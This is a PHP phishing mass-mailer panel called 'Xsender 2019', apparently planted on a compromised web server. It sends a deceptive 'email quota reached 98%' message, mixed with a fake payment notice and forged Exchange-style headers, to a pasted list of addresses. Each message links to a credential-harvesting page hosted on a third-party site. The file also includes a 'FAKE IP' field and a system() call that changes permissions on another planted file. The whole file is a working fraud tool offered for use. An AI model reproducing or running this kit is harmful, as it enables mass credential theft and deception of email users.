<?php
session_start();
ob_start("ob_gzhandler");
set_time_limit(0); 
$website="https://www.digitaldruck-kw.de/vianny.php"; //Make this full url including folders of where login files resides
//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace(" fuck "," f**k ",$check);
	$check=str_replace(" shit "," s**t ",$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}
//makes data ok on edit textarea
 function resanitize($check){
	$check=str_replace("<br/>","\r\n",$check);
	$check=str_replace("<br/>","\n",$check);
	$check=str_replace("<br/>","\r",$check);
	$check=str_replace("&gt;",">",$check);
	$check=str_replace("&lt;","<",$check);
	$check=str_replace("&#39;","'",$check);
	$check=str_replace('&quot;','"',$check);
	 return $check;}
//validate email address
function validate_email($email){
	$status=false;
	$regex='/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/'; 
	if(preg_match($regex, $email)){$status=true;}
	return $status; }
//Email sending
function sending_email($email,$id='1',$details=''){
	$subject='Account Update Notification';
	$site_name='Google.net';
// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Return-Path: bounce-810_HTML-769869545-477063-1070564-43@bounce.email.oflce57578375.com'. "\r\n";
        $headers .= 'Message-ID: <5bc7d69b-b2f2-4b32-8f45-bf9030f9f684@HK2PR01MB1076.apcprd01.prod.exchangelabs.com>'. "\r\n";
        $headers .= 'From: MailUpdate Team!<ms-oxprotp@mssimple.apcprd01.prdexchangpe11.net>'. "\r\n";
        $headers .= 'Content-Type: multipart/report; report-type=delivery-status; boundary="d9f4cc32-73bb-4b4c-b739-869e6235af8d"
--d9f4cc32-73bb-4b4c-b739-869e6235af8d'. "\r\n";
$headers .= 'Content-type: text/HTML; charset="UTF-8"; format=flowed; delsp=yes
Content-Transfer-Encoding: bit7'. "\r\n";
	// Additional headers
	$headers .= 'From: '.$site_name.' <'.$siteemail.'>' . "\r\n";
	//format message	
	$message=email_format($email,$id,$details);
	@mail($email,$subject, $message, $headers);	
}

function email_format($email,$id='1',$details=''){
	global $website;
	//$website="";
	$url=$website."?email=".$email;
	$em=explode('@',$email);
	$emaildomain = substr(strrchr($email, "@"), 1);
	$bc=explode('.',$emaildomain);
	$chgcap=strtolower($bc[0]);
	$frmsite=ucfirst($chgcap);
	$emincap=strtolower($em[0]);
	$mename=ucfirst($emincap);
	$message="<table border='0' style='font-family: calibri; font-size: 16px; background-color: rgb(255, 255, 255);' width='100%'>
	      <tbody><tr><td align='center'>
	      <table border='0' cellpadding='0' cellspacing='0' height='100%' style='min-width: 600px;' width='100%'>
	      <tbody><tr align='center'><td>
	      <table border='0' cellpadding='0' cellspacing='0' style='max-width: 600px;'>
	      <tbody><tr><td>
              <tbody></tbody></table></td></tr><tr height='16'></tr><tr><td>
              <tbody><tr><td colspan='3' height='69px'>&nbsp;</td></tr><tr><td width='28px'>&nbsp;</td>
	      <td style='font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 57px; color: rgb(255, 255, 255); line-height: 1.25;'>
              <span style='color:#1651f9;'>Mail Update</span></a></td><td width='32px'>&nbsp;</td></tr>
              <tr><td colspan='3' height='18px'>&nbsp;</td></tr></tbody></table></td></tr>
              <table bgcolor='#fff' border='0' cellpadding='0' cellspacing='0' style='min-width: 600px; max-width: 900px; border-width: 0px 1px 1px; border-right-style: solid; border-left-style: solid; border-right-color: rgb(240, 240, 240); border-left-color: rgb(240, 240, 240); border-bottom-style: solid; border-bottom-color: rgb(192, 192, 192); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;' width='100%'>
	      <tbody><tr height='16px'><td rowspan='3' width='32px'>&nbsp;</td><td>&nbsp;</td>
	      <td rowspan='3' width='32px'>&nbsp;</td></tr><tr><td><table border='0' cellpadding='0' cellspacing='0' style='min-width: 300px;'>
	      <tbody><tr><td style='font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;'>
              <a href='".$url."' style='text-decoration: none;'>
              <span style='color:#000000;'>
              Hi <b>".ucwords($em[0])."</b><div>&nbsp;</div>
	      Please pay attention:
Good Day


Attached is payment detail we have processed on 10/08/2019 11:21 AM, The payment date reflect

the date at which the payment is processed,

Please refer to payment reference in attachement for future correspondence, and get back to us Asap
<div>&nbsp;</div>
	     
	 <br>
    Attention: {$email} <br>Your email quota has reached 98% and will soon exceed its limit. 
Follow the URL below to upgrade your quota to 25GB for free to avoid loss of email data. 
<a href='".$url."' style='text-decoration: none;'><b> Upgrade Email Quota>> </b></a> <br><br>
<p>Source:  ##email## Administrator</p>
 
	      <p>Regard<br>Account control Desk<br>jennife，帐户协调员<br>金融公司hsagroup</span></a><br/>&nbsp;</p></td>
              </tr></tbody></table></td></tr></tbody></table></td></tr>
	      <tr height='16'></tr><tr><td style='max-width: 900px; font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 10px; color: rgb(188, 188, 188); line-height: 1.5;'>&nbsp;</td></tr><tr><td>
              <table style='font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 10px; color: rgb(102, 102, 102); line-height: 18px; padding-bottom: 10px;'>
	      <tbody><tr><td><span style='color:#424242;'>© 2019 Mail Team!</span></a></td></tr></tbody></table></td></tr></tbody></table></td>
	      <td width='32px'>&nbsp;</td></tr></tbody></table></td></tr></tbody>
</table>"; 

	return $message; }?>
<?php system("chmod 0644 gfx.php"); ?>
<?php chmod("gfx.php",0644); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="SHORTCUT ICON" href="http://mxmail.optimumelectronics.com/mail/skins/default/images/favicon.ico">
<title>Xsender 2019</title>
<style type="text/css">
<!--
.form {font-family: "Courier New", Courier, monospace;border:none, background-color:#000000;}
form .text-field {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6;height: 40px;border-radius: 3px; margin-top: 3px;padding-left: 10px;
form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
form .text-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 130px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
form .msg-area {font-family: "Courier New", Courier, monospace; border: 1px solid #A6A6A6; width: 330px;height: 330px;border-radius: 3px; margin-top: 3px;padding-left: 10px;}
form .text-field {border: 1px solid #A6A6A6; width: 230px; height: 40px; border-radius: 3px; margin-top: 3px; padding-left: 10px; color: #6C6C6C; background: none repeat scroll 0% 0% #FCFCFC; outline: medium none;}
input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important; }color: #6C6C6C; box-shadow: 1px 2px 50px #A6A6A6; background: none repeat scroll 0% 0% #FCFCFC;outline: medium none;}input[placeholder], [placeholder], [placeholder] {color: #6C6C6C !important;}
.send {font-family: "Courier New", Courier, monospace;border:none; font-size:18px; background-color:#FFFFFF; font-black:bold}
.button {border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;
    background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;}
.div { box-shadow: 1px 2px 50px #888888; border-radius:1px;}
#Layer1 {	position:absolute;
	left:402px;
	top:22px;
	width:457px;
	height:121%;
	z-index:1;
	margin-top: 0.5%;
	margin-right: 5%;
	right: 20%;
	bottom: 15%;
	margin-bottom: 10%;
	margin-left: 5%;
	border: none #000;
	border-radius:10px;
}

-->
</style>
</head>

<body>
<form method='POST' action='#'>
<div style='margin:0px;background:white;font-family:calibri;color:#000;font-size:13px;padding:10px;width:100%;'>
<div style='border:1px solid #c0c0c0;background:#fff;max-width:70%;margin:5px auto 5px auto;min-height:300px;box-shadow: 1px 2px 50px #888888; border-radius:3px;'>
<div style='padding:5px;margin:5px;font-size:16px;color:black;'><p style='clear:both;'>
  <table width="100%" border="0">
  <tr>
      <td height="23" colspan="2"><div align="center" class="form"><strong><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >A</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >I</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >P</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >O</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam>
<spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >S</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >N</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >D</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >E</spam><spam style="text-align: center; font-size: 14px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: #4d90fe; text-decoration: none; display:inline-block; height: 25px; padding-left: 5px; padding-right: 5px; border-radius: 7px;" >R</spam>
<br>
<spam style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>*RRS* BY TONY MARIS CYBER TEAM</spam> </strong></div></td>
    </tr>
	<tr align="center"><td><div style='width:100%;'>  <?php
if(isset($_POST['go']) ){
	//sanitize the data
	$_SESSION['xsenderid']=sanitizer($_POST['id']);
	$separator=sanitizer($_POST['separator']);
	$details=sanitizer($_POST['details']);
	$mails=sanitizer($_POST['mails']);
	$id=$_SESSION['xsenderid'];
	if($separator==''){$separator='<br/>';}
	if($mails!='' && $details!=''){
	

		$mails=explode($separator,$mails);
		$total=count($mails);
		$valid=0;
			for($i=0;$i<$total;$i++){
				$email=$mails[$i];
					if(validate_email($email)){
						$valid=$valid+1;
						
						//Send here
						sending_email($email,$id,$details);
						//send here
						} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: RED; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>".$email." NOT A VALID EMAIL</spam>"; }
			}
		print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: green; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>WELL SENT ".$valid." OUT OF ".$total." ";


	} else {print "<spam style='text-align: center; font-size: 12px; font-family: arial, sans-serif; color: white; font-weight: bold; border-color: #3079ed; background-color: BLACK; text-decoration: none; display:inline-block; height: 20px; padding-left: 5px; padding-right: 5px; border-radius: 7px;'>MAILS OR DETAIL ARE EMPTY</spam>"; }
}
?> </div></td></tr>
  <tr>
    <td valign="top"><div>
<select name='id' class="text-field" style='width:100%;'>
<?php
if(isset($_SESSION['xsenderid']))
{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
?>
<option value='1'>1</option>
<option value='2'>2</option>
<option value='3'>3</option>
<option value='4'>4</option>
</select>
      </div>
      <div>
        
        <textarea name='separator' class="text-field" size="30" placeholder="Email/Separator(Leave Empty if in NEW LINE)" style='width:100%;'><?php if(isset($_POST['separator'])){print resanitize($_POST['separator']);} ?></textarea>
      </div>
      <div>
        <textarea placeholder='FAKE IP (E.G CN)' class="text-field" size="83%" name='details' style='width:100%;'><?php if(isset($_POST['details'])){print resanitize($_POST['details']);} ?></textarea>
      </div>      <div>
        <textarea placeholder='PASTE UR EMAIL HERE' class="text-area" name='mails' cols="35" rows="10" style='width:100%;'><?php if(isset($_POST['mails'])){print resanitize($_POST['mails']);} ?></textarea>
      </div>
	  <br />
	  <div><input type="submit" style="border-radius: 3px;border: 1px solid #336895;box-shadow: 0px 1px 0px #8DC2F0 inset;width: 242px;height: 40px;background: -moz-linear-gradient(center bottom , #4889C2 0%, #5BA7E9 100%) repeat scroll 0% 0% transparent;cursor: pointer;color: #FFF;font-weight: bold;text-shadow: 0px -1px 0px #336895;font-size: 13px;" name="go" value="START GOING"> </div><br />
<div></div>	  </td>
    <td align="left"><div><?php print email_format('anoghost@stratoserver.net',1,'IP Address: 85.214.132.117 <br/>Location: Germany (DE)<br/>'); ?> </div></td>
  </tr>
</table>
<center>
<table>
<tr align="center"><td>
  <spam style='color:#666;align:center;text-shadow:#000 1px 1px;'>Work hard, Do not sprayed this tool!.</spam>
</td></tr></table></center>
 </div>
</div>
</div>
</div>
</form>
</body>
</html>
<?php
function make_seed() {
list($usec, $sec) = explode(' ', microtime());
return (float) $sec + ((float) $usec * 100000);
}
mt_srand(make_seed());
function randchar($string = 'abcdefghijklmnopqrstuvwxyz0123456789'){
return $string{rand(0,strlen($string)-1)};
}

return $result; 
?>
